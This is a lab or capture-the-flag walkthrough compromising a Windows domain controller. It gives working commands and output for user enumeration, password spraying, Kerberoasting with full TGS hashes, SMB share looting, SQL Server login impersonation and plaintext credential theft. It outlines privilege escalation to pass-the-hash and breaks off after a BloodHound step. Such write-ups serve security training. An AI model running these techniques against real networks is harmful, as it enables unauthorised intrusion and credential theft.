# SUMMARY
This engagement began with a comprehensive network scan that identified a Windows Server 2022 Domain Controller for the [hokkaido-aerospace.com](https://hokkaido-aerospace.com/) domain, hosting a suite of services including Active Directory, SQL Server, and SMB. Initial access was gained through a password spray attack against the SMB service, which validated the credentials "info:info" for a standard user account. Enumeration of accessible SMB shares revealed a NETLOGON share containing a file with a default password, "Start123!". This password was successfully used to authenticate the "discovery" service account.

Further exploitation involved querying the SQL Server with the compromised service account, where privilege escalation was achieved by impersonating the "hrappdb-reader" login. This led to the extraction of plaintext credentials for the "hrapp-service" account from an application database. BloodHound analysis of this account revealed it possessed the "GenericWrite" privilege over the "Hazel.Green" user object. The resulting Kerberos hash for that user was cracked, yielding the password "haze1988".

Leveraging these credentials, a targeted password reset was performed on the "molly.smith" user account via the bloodyAD tool. This provided access to a user session via Remote Desktop. Privilege enumeration within this session revealed the disabled but grantable "SeBackupPrivilege," which was abused to dump the SAM and SYSTEM registry hives. These hives were exfiltrated and processed to recover the Administrator account's NTLM hash. Finally, this hash was used in a pass-the-hash attack with Evil-WinRM to gain full administrative control of the Domain Controller, culminating in the capture of the final proof flag

# NMAP

Executing an Nmap scan with default scripts and version detection to enumerate open ports, identify running services and their versions, and run a suite of safe default scripts to gather further intelligence.

```bash
sudo nmap -sC -sV  192.168.236.40
```

The Nmap scan results confirm the target is a Windows Server Domain Controller for the domain "[hokkaido-aerospace.com](https://hokkaido-aerospace.com/)" with the hostname "DC". Key services include Active Directory services, Microsoft SQL Server, SMB file sharing, IIS web server, DNS, Kerberos authentication, and Remote Desktop. A potentially risky HTTP TRACE method is enabled on the web server, and NTLM information was gathered from the SQL Server and RDP services.

```output
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-10 16:47:12Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
|_ssl-date: 2025-12-10T16:48:00+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2023-12-07T13:54:18
|_Not valid after:  2024-12-06T13:54:18
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
|_ssl-date: 2025-12-10T16:48:00+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2023-12-07T13:54:18
|_Not valid after:  2024-12-06T13:54:18
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   192.168.236.40:1433: 
|     Target_Name: HAERO
|     NetBIOS_Domain_Name: HAERO
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: hokkaido-aerospace.com
|     DNS_Computer_Name: dc.hokkaido-aerospace.com
|     DNS_Tree_Name: hokkaido-aerospace.com
|_    Product_Version: 10.0.20348
| ms-sql-info: 
|   192.168.236.40:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-11-14T13:04:52
|_Not valid after:  2055-11-14T13:04:52
|_ssl-date: 2025-12-10T16:48:00+00:00; 0s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
|_ssl-date: 2025-12-10T16:48:00+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2023-12-07T13:54:18
|_Not valid after:  2024-12-06T13:54:18
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
|_ssl-date: 2025-12-10T16:48:00+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2023-12-07T13:54:18
|_Not valid after:  2024-12-06T13:54:18
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-12-10T16:48:00+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: HAERO
|   NetBIOS_Domain_Name: HAERO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hokkaido-aerospace.com
|   DNS_Computer_Name: dc.hokkaido-aerospace.com
|   DNS_Tree_Name: hokkaido-aerospace.com
|   Product_Version: 10.0.20348
|_  System_Time: 2025-12-10T16:47:51+00:00
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Not valid before: 2025-11-13T13:04:34
|_Not valid after:  2026-05-15T13:04:34
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-12-10T16:47:55
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.69 seconds
```

Executing NetExec to enumerate the SMB service, confirming the target is a Windows Server 2022 Domain Controller with SMB signing required.

```bash
nxc smb  192.168.236.40

SMB         192.168.236.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:False) 
```

Modifying the local hosts file to resolve the target's domain and hostname to its IP address, enabling proper domain-based service enumeration and authentication attempts.

```bash
cat  /etc/hosts
192.168.236.40   hokkaido-aerospace.com dc.hokkaido-aerospace.com
```

Performing Kerberos username enumeration against the domain controller, identifying valid domain user accounts including "administrator", "info", "discovery", and "maintenance".

```bash
./kerbrute  userenum -d hokkaido-aerospace.com --dc 192.168.236.40/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 100

2025/12/10 17:39:49 >  [+] VALID USERNAME:       info@hokkaido-aerospace.com
2025/12/10 17:39:50 >  [+] VALID USERNAME:       administrator@hokkaido-aerospace.com
2025/12/10 17:39:50 >  [+] VALID USERNAME:       INFO@hokkaido-aerospace.com
2025/12/10 17:39:51 >  [+] VALID USERNAME:       Info@hokkaido-aerospace.com
2025/12/10 17:39:52 >  [+] VALID USERNAME:       discovery@hokkaido-aerospace.com
2025/12/10 17:39:52 >  [+] VALID USERNAME:       Administrator@hokkaido-aerospace.com
2025/12/10 17:40:17 >  [+] VALID USERNAME:       maintenance@hokkaido-aerospace.com
```

Conducting a password spray attack against the SMB service using the enumerated usernames, successfully authenticating with the credentials "info:info". All other login attempts failed

```bash
 netexec smb 192.168.236.40  -u users.txt -p users.txt --continue-on-success                                                 
SMB         192.168.236.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:False) 
SMB         192.168.236.40  445    DC               [+] hokkaido-aerospace.com\info:info 
SMB         192.168.236.40  445    DC               [-] hokkaido-aerospace.com\administrator:info STATUS_LOGON_FAILURE 
SMB         192.168.236.40  445    DC               [-] hokkaido-aerospace.com\discovery:info STATUS_LOGON_FAILURE 
SMB         192.168.236.40  445    DC               [-] hokkaido-aerospace.com\maintenance:info STATUS_LOGON_FAILURE 
SMB         192.168.236.40  445    DC               [-] hokkaido-aerospace.com\administrator:administrator STATUS_LOGON_FAILURE 
SMB         192.168.236.40  445    DC               [-] hokkaido-aerospace.com\discovery:administrator STATUS_LOGON_FAILURE 
SMB         192.168.236.40  445    DC               [-] hokkaido-aerospace.com\maintenance:administrator STATUS_LOGON_FAILURE 
SMB         192.168.236.40  445    DC               [-] hokkaido-aerospace.com\administrator:discovery STATUS_LOGON_FAILURE 
SMB         192.168.236.40  445    DC               [-] hokkaido-aerospace.com\discovery:discovery STATUS_LOGON_FAILURE 
SMB         192.168.236.40  445    DC               [-] hokkaido-aerospace.com\maintenance:discovery STATUS_LOGON_FAILURE 
SMB         192.168.236.40  445    DC               [-] hokkaido-aerospace.com\administrator:maintenance STATUS_LOGON_FAILURE 
SMB         192.168.236.40  445    DC               [-] hokkaido-aerospace.com\discovery:maintenance STATUS_LOGON_FAILURE 
SMB         192.168.236.40  445    DC               [-] hokkaido-aerospace.com\maintenance:maintenance STATUS_LOGON_FAILURE 

```

Querying the domain for Service Principal Names associated with user accounts, which successfully retrieved password hashes for the "discovery" and "maintenance" service accounts in Kerberos TGS format for offline cracking.

```bash
 impacket-GetUserSPNs -request  hokkaido-aerospace.com/info:info -dc-ip 192.168.236.40 
Impacket v0.13.0.dev0+20250528.4535.5b338613 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName                   Name         MemberOf                                           PasswordLastSet             LastLogon  Delegation 
-------------------------------------  -----------  -------------------------------------------------  --------------------------  ---------  ----------
discover/dc.hokkaido-aerospace.com     discovery    CN=services,CN=Users,DC=hokkaido-aerospace,DC=com  2023-12-06 15:42:56.221832  <never>               
maintenance/dc.hokkaido-aerospace.com  maintenance  CN=services,CN=Users,DC=hokkaido-aerospace,DC=com  2023-11-25 13:39:04.869703  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*discovery$HOKKAIDO-AEROSPACE.COM$hokkaido-aerospace.com/discovery*$69966d38a55c7d2661190dfa7d25464b$42f4acc81504aa1733c27641a75bf91951b795813a36b0c25a59d2e61a28a7807f5e353f8b11d89c7d8df1a1c640a28bc10688b0e387c2c890dfeee9f3622de89edef3f2c064aad5378575543aa20aa7ee2418dd85ce2d7fb06c2b804127e3b78c113b3db8ab5535423c09df9309b093e90792143f4fc457534f941402401153a05b29ad7eb570d24148eb0239bfcecb3667139d169641ddb56b14f2c2273d160143611d59156db68f2303f1185bf7a1f72f8058beb3df0c9480e96d62db43110e1d5cf9cfe041769bb1c37e0b2bf6a43321e17691da09855f7103ea77c4916ca8dad7c4c254a9762c34bb8079ad1ffc46e3019d98b44a6a82a5e54e44c31998eb6c71f8edae314da4ca800ead15d348adc4761fde5120191741b12d2b22fa094e2b12e69580391e6f6dc6b6200ca963018e0575fa9ac943bbbbee7f57e2b9dcb9d08ffe73edea526517e588069193ee59b2863d739606d4e08a54c1a75cf46e6a7e7b9e1482db3bbf75c0e0bb9da74fec936d4f8168d4aaaba4adf831d93476dc458a4a859781a325df7310a578d050ca0e78d3a640d011ef7020ffffa47b09b530f4f1fb43a04e524ec06f7fc9ff200a55674c52fd77747a2fc61906f82b4c1146b3c19edac1c0260c39b5d0091d60124b2a1d75e1ab83d7ecf980161ecc1dcce89c25f3f15c3219ba770f631cc271180be89f4f1cd856e8e9acbab2914e85c6d541faba6cff55dc67a2dc3fdf3fbc64c28efc3f32573c24e40e6850d460f4394bbf15d34f8f11d3cd58caadaa8b421eaa584e1060b98978c85225f7507f1cd0497270ae83ad597e4111d458f5e90a7fdf9af99829ba8d822a9a2cb2ee1785252250ae3f49947b35e32e49fc56ed29f83fe4ba7620f979ae31bf49668b623106232fbbdce56f5a946a01cb4defebda6ad6221f79e96ae269ff8d3554592a487193b4137ce88b6908f6ac0c133d36df47c61df66ad6282cd9cc845109fefaf08210762677ad7a1411add29154bdf7f9459fb8c7e8db0d36930b100cfbad342fc817e4cdb129f93f7a9960216ed71124985b5887cb1d44b047c7b56288fdd7c31120d5fbd817714927a122dcf6a5689d84cf726801b96a2a8004cc30bf6b797ed66ead2fb64e16dbbcd14cf3fa3366f168c4c71811d2882f6ac89b4052921f29aa334b625255aef29372b08a3c7abec49b71022623d49f261cd51f0b4348bf530fea3c2ffa4f5e9931cdd561734be5245790857a8103e18ab917432da58641498d6993aaa081dbb1a663fe9513e7ef60a2de5beb55dfefa7de8f70b6b1c70b3afe78082ea14175198debf908298a7c0d91699ccd0fa74ce458da36950a0f2789454b19581f1e60d524dab0b6885af03f63c59830bc892bd7d86d00d1db02fbb801663a7fb9a4837a22ad911c6dbc6613692f9ee1136a81de5bccdd719c6487bcfd45c849cfdbabc21cb40db2e588bb127cdab8875c06c57b74605e
$krb5tgs$23$*maintenance$HOKKAIDO-AEROSPACE.COM$hokkaido-aerospace.com/maintenance*$25c54d3f2359c49cebdd9de8de9faf7c$c174b3c4203ff2f690ca64a276b2785749393506321f37ed882493847605a163575d7b42325f84fb55f5bc070eb617b3002761e3e44df5e2ceb08006c7c8a28e408636a55e3caf146a5a5344c4fee5b5cbd8817084105c17ffe5685227e08d11886b28024c868c715a82c898ecc47929caee5cb61b92370d4741e020595a9c9d9c7daeee7774758cfa69e69ee0e42316d03499d9c46eac98aeafe4beae79fd6b9dde777eb8b683ececf1b98501abaf50a3ead5cf5328c501afdda04188bf33f3659966365fc2dc3547a2457bc9972941be04b4e6fa435ae1deec43aac2e4e296ee67806245357964fcc16c18285b24c6ab6d70ca764404f711e827a65dcfb4d3fced60789ae67fed75de2aa82ea0deb7ba8fb70694d91c0e2a1f4e2baee35914f66b9e79144d317e3dad9b66be2add91dc25e074acd8fe346de30d6b6c3f85818d523481e49c9115a0b7e2e5e5d86f9fbe55392c10302f39045fd1207512335a5bb43a41b0c475c70b2b52ff3f648baf61742acf5b05126fda9be8ac1fdbe54dd23e590c468b21ffdc72959d6b068b85a8c87f7a98aa5ad3c4b60a786d80d5964d5d522626f5365cca4bd318173cbc67cb12d10bb783c6e38745e2fdc4c239c435f89dcddaffcfbfc4ed800e56369c1a64a368764f28ef2f55678f1e6c6f1de529c9903377b2feb296a9c58cbf7aa45cc22467ea1765888e03ad8b38c10d155a24a477fd272ed11a4492d0954b5de4e9eac660c26ce56cb1b6326353cceb7da6f74fb1469fdfb3894778d8611e57be98cd73411b9dcd3a5f326e18f28643e45d7455e3076d49b859b7039906629a2ce92f05f03a6a192a1acacaa48c36fbd3cd4c04b6dba4d47e5180370991f7e43c7fbb4d582135411d6dde42ebff9a99588350dfa263328108fed8097a2cb7ff4b91c7caa66a82308648d19514d911ae566283878dd3f02f4752313e1753503cda6fd223055c3e705dd7de97850e25705641058049a0c2018e1af2c80a1b1b29a6e07430a9c851442d2380bd271eee4002639b50afdfdd32244df6abb66dce5c9fe7e83d7dcf29fc758722795fd77127e5ccda3fd2d6795ac83f5e41d597af57823eb92c4d4ee0b2698393dba80db0f156731407fbeaeb0ffb4827bc7f9b2fd6e26f29279b9b61de2e492fbca832d0587f1a8016dffc5cf5d397fd73559a265f64581f156430fa80d38e194a9588d24431a2ff38d46e17a0fa1572f9ad5c8ff5fb19a3a81134485c3ab1a15db4c7225a8ffb4e458c7a704aa205eb3d5dd979c2edca48eed505a777acb4d5bc6a9289d89be94e01fe8edb389e6474381172733504008c0ee27bf8c3b5da2141d844e0027cbfd3af4cb28f39f1873b3f33845b49c8a635265213c111631e2563ee42f2f3bc73192c19c86533c4b6d6c72cb7d4de064dc7c0cdf6710ea29c6568f1b9dec78a00c01da7b27ef67f07c095d897c02f34596b6dc6c547f94ffee4d438

```

Authenticating to the SMB service with the credentials "info:info" and enumerating network shares, identifying accessible shares including user home directories and system shares.

```bash
netexec smb dc.hokkaido-aerospace.com  -u info -p info  --shares                                       
SMB         192.168.236.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:False) 
SMB         192.168.236.40  445    DC               [+] hokkaido-aerospace.com\info:info 
SMB         192.168.236.40  445    DC               [*] Enumerated shares
SMB         192.168.236.40  445    DC               Share           Permissions     Remark
SMB         192.168.236.40  445    DC               -----           -----------     ------
SMB         192.168.236.40  445    DC               ADMIN$                          Remote Admin
SMB         192.168.236.40  445    DC               C$                              Default share
SMB         192.168.236.40  445    DC               homes           READ,WRITE      user homes
SMB         192.168.236.40  445    DC               IPC$            READ            Remote IPC
SMB         192.168.236.40  445    DC               NETLOGON        READ            Logon server share 
SMB         192.168.236.40  445    DC               SYSVOL          READ            Logon server share 
SMB         192.168.236.40  445    DC               UpdateServicesPackages READ            A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.                                                                                                                                                        
SMB         192.168.236.40  445    DC               WsusContent     READ            A network share to be used by Local Publishing to place published content on this WSUS system.
SMB         192.168.236.40  445    DC               WSUSTemp                        A network share used by Local Publishing from a Remote WSUS Console Instance.
                                                                  

```

Spidering the "homes" SMB share to enumerate all accessible directories, revealing a list of user home folders for multiple domain users.

```bash
nxc smb dc.hokkaido-aerospace.com  -u info -p info  -d hokkaido-aerospace.com   --shares --spider homes --regex .


MB         192.168.236.40  445    DC               //192.168.236.40/homes/.. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Angela.Davies [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Annette.Buckley [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Anthony.Anderson [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Catherine.Knight [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Charlene.Wallace [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Cheryl.Singh [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Deborah.Francis [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Declan.Woodward [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Elliott.Jones [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Gordon.Brown [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Grace.Lees [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Hannah.O'Neill [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Irene.Dean [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Julian.Davies [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Lynne.Tyler [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Molly.Edwards [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Rachel.Jones [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Sian.Gordon [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Tracy.Wood [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Victor.Kelly [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Angela.Davies/. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Angela.Davies/.. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Annette.Buckley/. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Annette.Buckley/.. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Anthony.Anderson/. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Anthony.Anderson/.. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Catherine.Knight/. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Catherine.Knight/.. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Charlene.Wallace/. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Charlene.Wallace/.. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Cheryl.Singh/. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Cheryl.Singh/.. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Deborah.Francis/. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Deborah.Francis/.. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Declan.Woodward/. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Declan.Woodward/.. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Elliott.Jones/. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Elliott.Jones/.. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Gordon.Brown/. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Gordon.Brown/.. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Grace.Lees/. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Grace.Lees/.. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Hannah.O'Neill/. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Hannah.O'Neill/.. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Irene.Dean/. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Irene.Dean/.. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Julian.Davies/. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Julian.Davies/.. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Lynne.Tyler/. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Lynne.Tyler/.. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Molly.Edwards/. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Molly.Edwards/.. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Rachel.Jones/. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Rachel.Jones/.. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Sian.Gordon/. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Sian.Gordon/.. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Tracy.Wood/. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Tracy.Wood/.. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Victor.Kelly/. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/homes/Victor.Kelly/.. [dir]


```

Processing the previously enumerated list of user home directories to extract only the usernames and output them to a file for subsequent enumeration or attack.

```bash
cat user.txt | awk -F'/' '{print $5}' >user_list
```

Spidering the NETLOGON share and discovering a file named "password_reset.txt", which may contain sensitive information such as default or reset credentials.

```bash
nxc smb dc.hokkaido-aerospace.com -u info -p info -d hokkaido-aerospace.com --shares --spider NETLOGON --regex .
SMB         192.168.236.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:False) 
SMB         192.168.236.40  445    DC               [+] hokkaido-aerospace.com\info:info 
SMB         192.168.236.40  445    DC               [*] Enumerated shares
SMB         192.168.236.40  445    DC               Share           Permissions     Remark
SMB         192.168.236.40  445    DC               -----           -----------     ------
SMB         192.168.236.40  445    DC               ADMIN$                          Remote Admin
SMB         192.168.236.40  445    DC               C$                              Default share
SMB         192.168.236.40  445    DC               homes           READ,WRITE      user homes
SMB         192.168.236.40  445    DC               IPC$            READ            Remote IPC
SMB         192.168.236.40  445    DC               NETLOGON        READ            Logon server share 
SMB         192.168.236.40  445    DC               SYSVOL          READ            Logon server share 
SMB         192.168.236.40  445    DC               UpdateServicesPackages READ            A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.                                                                                                                                                        
SMB         192.168.236.40  445    DC               WsusContent     READ            A network share to be used by Local Publishing to place published content on this WSUS system.
SMB         192.168.236.40  445    DC               WSUSTemp                        A network share used by Local Publishing from a Remote WSUS Console Instance.
SMB         192.168.236.40  445    DC               [*] Started spidering
SMB         192.168.236.40  445    DC               [*] Spidering .
SMB         192.168.236.40  445    DC               //192.168.236.40/NETLOGON/. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/NETLOGON/.. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/NETLOGON/temp [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/NETLOGON/temp/. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/NETLOGON/temp/.. [dir]
SMB         192.168.236.40  445    DC               //192.168.236.40/NETLOGON/temp/password_reset.txt [lastm:'2023-12-06 15:44' size:27]
SMB         192.168.236.40  445    DC               [*] Done spidering (Completed in 0.09434652328491211)


```

Downloading the file "password_reset.txt" from the NETLOGON share for offline analysis of its contents.

```bash
nxc smb dc.hokkaido-aerospace.com -u info -p info -d hokkaido-aerospace.com --share NETLOGON  --get-file 'temp\\password_reset.txt' password_reset.txt
SMB         192.168.236.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:False) 
SMB         192.168.236.40  445    DC               [+] hokkaido-aerospace.com\info:info 
SMB         192.168.236.40  445    DC               [*] Copying "temp\\password_reset.txt" to "password_reset.txt"
SMB         192.168.236.40  445    DC               [+] File "temp\\password_reset.txt" was downloaded to "password_reset.txt"
```

Reading the contents of the downloaded file, which reveals a potential default or initial password "Start123!" for user accounts.

```bash
cat password_reset.txt                          
Initial Password: Start123!   
```

Performing a password spray attack using the discovered password "Start123!" against the enumerated user list, successfully authenticating with the "discovery" service account.

```bash
nxc smb dc.hokkaido-aerospace.com -u users.txt -p 'Start123!'  --continue-on-success                                                             
SMB         192.168.236.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:False) 
SMB         192.168.236.40  445    DC               [-] hokkaido-aerospace.com\info:Start123! STATUS_LOGON_FAILURE 
SMB         192.168.236.40  445    DC               [-] hokkaido-aerospace.com\administrator:Start123! STATUS_LOGON_FAILURE 
SMB         192.168.236.40  445    DC               [+] hokkaido-aerospace.com\discovery:Start123! 
SMB         192.168.236.40  445    DC               [-] hokkaido-aerospace.com\maintenance:Start123! STATUS_LOGON_FAILURE 

```

Establishing a connection to the Microsoft SQL Server using the compromised credentials for the "discovery" account with Windows authentication to interact with the database.

```bash
impacket-mssqlclient  'hokkaido-aerospace.com/discovery':'Start123!'@192.168.236.40 -dc-ip 192.168.236.40 -windows-auth
```

Querying the SQL Server instance for available databases, identifying a user database named "hrappdb".

```bash
SQL (HAERO\discovery  guest@master)> SELECT name FROM master..sysdatabases;
name      
-------   
master    

tempdb    

model     

msdb      

hrappdb   


```

Attempting to switch to the "hrappdb" database, which is denied due to insufficient permissions for the "discovery" user in the current security context.

```bash
SQL (HAERO\discovery  guest@master)> use hrappdb

ERROR(DC\SQLEXPRESS): Line 1: The server principal "HAERO\discovery" is not able to access the database "hrappdb" under the current security context.
```

Querying for server-level principals that have the IMPERSONATE permission, identifying the "hrappdb-reader" login as a potential target for privilege escalation via impersonation.

```bash
SQL (HAERO\discovery  guest@master)> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'

name             
--------------   
hrappdb-reader

```

Successfully impersonating the "hrappdb-reader" login and switching the database context to "hrappdb".

```bash
QL (HAERO\discovery  guest@master)> EXECUTE AS LOGIN = 'hrappdb-reader'
SQL (hrappdb-reader  guest@master)> use hrappdb
ENVCHANGE(DATABASE): Old Value: master, New Value: hrappdb
INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'hrappdb'.
```

Listing tables within the current database, finding a single table named "sysauth".

```bash
SQL (hrappdb-reader  hrappdb-reader@hrappdb)> SELECT * FROM hrappdb.INFORMATION_SCHEMA.TABLES;
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE   
-------------   ------------   ----------   ----------   
hrappdb         dbo            sysauth      b'BASE TABLE'   

```

Querying the contents of the "sysauth" table, revealing stored credentials for a service account "hrapp-service" with the plaintext password "Untimed$Runny".

```bash
SQL (hrappdb-reader  hrappdb-reader@hrappdb)> select * from sysauth;
id   name               password           
--   ----------------   ----------------   
 0   b'hrapp-service'   b'Untimed$Runny'  

```

Using the compromised service account credentials with BloodHound to collect Active Directory reconnaissance data for all available collection methods, outputting the results to a compressed file.

```bash
bloodhound-python -u "hrapp-service" -p 'Untimed$Runny' -d hokkaido-aerospace.com -c all --zip -ns 192.168.236.40

INFO: Compressing output into 20251210190501_bloodhound.zip
```

The output references a file or BloodHound data indicating the "HRAPP-SERVICE" account has the "GenericWrite" permission over the "HAZEL GREEN" user object in Active Directory, which can be abused for targeted attacks like password reset or Shadow Credentials.

![BloodHound Analysis](images/hokkadu.png)

Capturing the Kerberos hash for the user "Hazel.Green" from the earlier BloodHound data for offline cracking or pass-the-hash attacks.

```bash
